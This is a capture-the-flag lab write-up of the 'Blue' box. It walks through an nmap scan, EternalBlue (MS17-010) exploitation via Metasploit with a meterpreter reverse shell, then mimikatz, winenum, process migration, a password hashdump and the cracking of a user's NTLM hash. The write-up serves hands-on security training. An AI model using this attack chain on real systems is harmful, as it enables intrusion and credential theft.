# Blue

My friend motivated me to root yet another box, so lets goooo!

## Enumeration

```bash
➜  ~ sudo nmap -sC -sV -Pn -n $IP
Password:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-29 13:39 MDT
Nmap scan report for 10.10.171.93
Host is up (0.18s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2020-08-29T19:40:58+00:00
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2020-08-28T19:38:28
|_Not valid after:  2021-02-27T19:38:28
|_ssl-date: 2020-08-29T19:41:04+00:00; 0s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h00m00s, deviation: 2h14m10s, median: 0s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:38:71:95:53:fd (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-08-29T14:40:58-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-08-29T19:40:58
|_  start_date: 2020-08-29T19:38:26
```
I can see right off the bat that we are likely working with Windows 7 Professional 7601 Service Pack 1. From previously working with a similar machine, I know that this box is vulnerable to EternalBlue, MS17-010. So lets fire our Blue aba di aba da lasers at it!

## Exploitation

```bash
~ /opt/metasploit-framework/bin/msfconsole

This copy of metasploit-framework is more than two weeks old.
 Consider running 'msfupdate' to update to the latest version.
                                                  

                                   .,,.                  .
                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
                  d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'
  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P
  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b
 d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b
d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88
                          .a#$$$$$$"`          88b  d8P  88b`?8888P'
                       ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:
                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'
                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'
              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'
           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'
_______________________________________________________________   ,&$$$$$$'_____
                                                                 ll&&$$$$'
                                                              .;;lll&&&&'
                                                            ...;;lllll&'
                                                          ......;;;llll;;;....
                                                           ` ......;;;;... .  .


       =[ metasploit v5.0.99-dev-8926b1893ef31ea40a5582ddbe27d2b92c3c3074]
+ -- --=[ 2043 exploits - 1106 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Display the Framework log using the log command, learn more with help log

msf5 > search EternalBlue

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

msf5 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.233    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs

msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.28.61
RHOSTS => 10.10.28.61
msf5 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.2.27.38:1337 
[*] 10.10.28.61:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.28.61:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.28.61:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.28.61:445 - Connecting to target for exploitation.
[+] 10.10.28.61:445 - Connection established for exploitation.
[+] 10.10.28.61:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.28.61:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.28.61:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.28.61:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.28.61:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.28.61:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.28.61:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.28.61:445 - Sending all but last fragment of exploit packet
[*] 10.10.28.61:445 - Starting non-paged pool grooming
[+] 10.10.28.61:445 - Sending SMBv2 buffers
[+] 10.10.28.61:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.28.61:445 - Sending final SMBv2 buffers.
[*] 10.10.28.61:445 - Sending last fragment of exploit packet!
[*] 10.10.28.61:445 - Receiving response from exploit packet
[+] 10.10.28.61:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.28.61:445 - Sending egg to corrupted connection.
[*] 10.10.28.61:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.28.61
[*] Meterpreter session 1 opened (10.2.27.38:1337 -> 10.10.28.61:49301) at 2020-08-29 15:13:04 -0600
[+] 10.10.28.61:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.28.61:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.28.61:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > ls
Listing: C:\Windows\system32
100666/rw-rw-rw-  28672     fil   2009-07-13 17:37:10 -0600  DeviceMetadataParsers.dll
100666/rw-rw-rw-  189952    fil   2009-07-13 17:57:53 -0600  DevicePairing.dll
100666/rw-rw-rw-  225280    fil   2010-11-20 20:24:00 -0700  DevicePairingFolder.dll
100666/rw-rw-rw-  87552     fil   2009-07-13 17:35:45 -0600  DevicePairingHandler.dll
100666/rw-rw-rw-  58368     fil   2009-07-13 17:57:47 -0600  DevicePairingProxy.dll
100777/rwxrwxrwx  74752     fil   2009-07-13 17:57:52 -0600  DevicePairingWizard.exe
100777/rwxrwxrwx  92672     fil   2009-07-13 17:56:16 -0600  DeviceProperties.exe
100666/rw-rw-rw-  10240     fil   2009-07-13 17:57:46 -0600  DeviceUxRes.dll
100666/rw-rw-rw-  68096     fil   2009-07-13 17:45:50 -0600  DfsShlEx.dll
```
## Post Exploitation

Lets load up the power house that is Mimikatz and dump all relevant information a Windows system could have. 

```bash
meterpreter > load mimikatz
Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (6.1 Build 7601, Service Pack 1).). Did you mean to 'load kiwi' instead?
Success.
meterpreter > msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

AuthID   Package    Domain        User           Password
------   -------    ------        ----           --------
0;997    Negotiate  NT AUTHORITY  LOCAL SERVICE  n.s. (Credentials KO)
0;996    Negotiate  WORKGROUP     JON-PC$        n.s. (Credentials KO)
0;24680  NTLM                                    n.s. (Credentials KO)
0;999    NTLM       WORKGROUP     JON-PC$        n.s. (Credentials KO)
meterpreter > run winenum
[*] Running Windows Local Enumeration Meterpreter Script
[*] New session on 10.10.28.61:445...
[*] Saving general report to /Users/titanium/.msf4/logs/scripts/winenum/JON-PC_20200829.2000/JON-PC_20200829.2000.txt
[*] Output of each individual command is saved to /Users/titanium/.msf4/logs/scripts/winenum/JON-PC_20200829.2000
[*] Checking if JON-PC is a Virtual Machine ........
[*] 	This is a Xen Virtual Machine.
[*] 	UAC is Disabled
[*] Running Command List ...
[*] 	running command cmd.exe /c set
[*] 	running command arp -a
[*] 	running command ipconfig /all
[*] 	running command ipconfig /displaydns
[*] 	running command route print
[*] 	running command netstat -nao
[*] 	running command net view
[*] 	running command netstat -vb
[*] 	running command netstat -ns
[*] 	running command net accounts
[*] 	running command net session
[*] 	running command net user
[*] 	running command net group
[*] 	running command net localgroup
[*] 	running command tasklist /svc
[*] 	running command net view /domain
[*] 	running command netsh firewall show config
[*] 	running command net localgroup administrators
[*] 	running command net share
[*] 	running command net group administrators
[*] 	running command gpresult /SCOPE COMPUTER /Z
[*] 	running command gpresult /SCOPE USER /Z
[*] 	running command netsh wlan show drivers
[*] 	running command netsh wlan show interfaces
[*] 	running command netsh wlan show profiles
[*] 	running command netsh wlan show networks mode=bssid
[*] Running WMIC Commands ....
[*] 	running command wmic useraccount list
[*] 	running command wmic logicaldisk get description,filesystem,name,size
[*] 	running command wmic netlogin get name,lastlogon,badpasswordcount
[*] 	running command wmic group list
[*] 	running command wmic volume list brief
[*] 	running command wmic service list brief
[*] 	running command wmic netclient list brief
[*] 	running command wmic netuse get name,username,connectiontype,localname
[*] 	running command wmic share get name,path
[*] 	running command wmic nteventlog get path,filename,writeable
[*] 	running command wmic startup list full
[*] 	running command wmic rdtoggle list
[*] 	running command wmic product get name,version
[*] 	running command wmic qfe
[*] Extracting software list from registry
[*] Dumping password hashes...
[*] Hashes Dumped
[*] Getting Tokens...
[*] All tokens have been processed
[*] Done!
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 432   660   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 460   708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 564   556   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 612   556   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 620   604   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 660   604   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 696   708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
 708   612   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 716   612   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 724   612   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 832   708   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
 900   708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
 948   708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1060  708   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 1148  708   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
 ```

 ## Pivoting

The box wanted us to learn how to switch between processes. This was a new technique that I learned. 

```bash
meterpreter > migrate 2440
[*] Migrating from 1276 to 2440...
[*] Migration completed successfully.
```

The box wanted to show us that we could pivot between processes by using the ```migrate PID``` command. The process of migrating processes (ha) is not very stable as you can see from above that I lost my meterpreter reverse shell. So we'll go ahead and run the exploit again and see if we can find a process that we can successfully pivot to. 

```bash
meterpreter > migrate 2704
[*] Migrating from 1276 to 2704...
[-] core_migrate: Operation failed: Access is denied.
meterpreter > migrate 2804
[*] Migrating from 1276 to 2804...
[-] core_migrate: Operation failed: Access is denied.
meterpreter > migrate 2632
[*] Migrating from 1276 to 2632...
[-] core_migrate: Operation failed: Access is denied.
meterpreter > migrate 2072
[*] Migrating from 1276 to 2072...
[-] Error running command migrate: Rex::RuntimeError Cannot migrate into this process (insufficient privileges)
meterpreter > migrate 1948
[*] Migrating from 1276 to 1948...
[-] core_migrate: Operation failed: Access is denied.
meterpreter > migrate 1612
[*] Migrating from 1276 to 1612...
[*] Migration completed successfully.
```

Huzzah! Took me a bit, but I was able to pivot to PID 1612 which funny enough is ```C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe``` which is Amazons EC2 configuration program. Such haxs. Much privilege. 

## Credential Harvesting

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Boom! We have some sexy hashes. I used crackstation.net and their giant 19GB 1.5 billion entry wordlist of precomputed password hashes to crack Jon's NTLM password hash. The hash ```ffb43f0de35be4d9917ac0cc8ad57f8d``` turned out to be password ```alqfna22```. 

## Flags

Our next objective was to find the boxes flags. I simply looked for any flag*.txt files since they said there were 3 flags:

```bash
meterpreter > search -f flag*.txt
Found 3 results...
    c:\flag1.txt (24 bytes)
    c:\Users\Jon\Documents\flag3.txt (37 bytes)
    c:\Windows\System32\config\flag2.txt (34 bytes)

meterpreter > cat c:\\flag1.txt
flag{REDACTED}
meterpreter > cat c:\\Windows\\System32\\config\\flag2.txt
flag{REDACTED}
meterpreter > cat c:\\Users\\Jon\\Documents\\flag3.txt
flag{REDACTED}
```

Small note. If you noticed above, when we ran the ```search -f flag*.txt``` command, it gave us back filepaths that all had a single backslash. When you try to ```cat``` that exact file path, you might get an error saying that the file or directory doesn't exist. In order to solve this, you have to include a double backslash for every backslash and then you're able to correctly read the file contents.

